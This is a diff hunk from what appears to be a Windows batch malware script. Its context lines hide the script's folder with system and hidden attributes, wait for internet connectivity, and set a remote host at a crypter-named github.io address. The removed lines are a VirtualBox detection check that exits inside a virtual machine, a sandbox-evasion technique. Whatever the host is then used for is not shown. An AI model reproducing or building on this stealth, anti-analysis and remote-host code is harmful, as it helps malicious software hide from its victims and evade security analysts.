@@ -4,12 +4,6 @@ attrib +s +h +i "%~dp0"
 :connectivitycheck
 ping www.google.com -n 1 -w 5000 >NUL
 if errorlevel 1 goto Connectivitycheck
-for /f "tokens=1* delims=: " %%A in (
-  'powershell Get-WmiObject Win32_Computersystem model 2^>NUL^|find "Model            :"'
-) Do set model=%%B
-if "%model%" == "VirtualBox" (
-    exit
-)
 
 Set host=https://cryptedodissey.github.io
 
